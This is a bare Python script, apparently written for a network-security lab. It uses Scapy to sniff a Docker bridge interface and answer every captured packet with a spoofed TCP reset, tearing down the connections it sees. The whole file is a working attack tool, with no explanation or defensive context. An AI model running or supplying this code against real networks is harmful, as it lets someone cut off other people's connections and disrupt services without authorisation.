#!/usr/bin/env python3
from scapy.all import *
def spoof(pkt):
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[IP].dport, dport=pkt[IP].sport, flags="R", seq=pkt[IP].ack, ack=pkt[IP].seq)
    spoofpkt = ip/tcp
    ls(spoofpkt)
    send(spoofpkt,verbose=0)
pkt = sniff(iface="br-b2bd08340fb7", prn=spoof)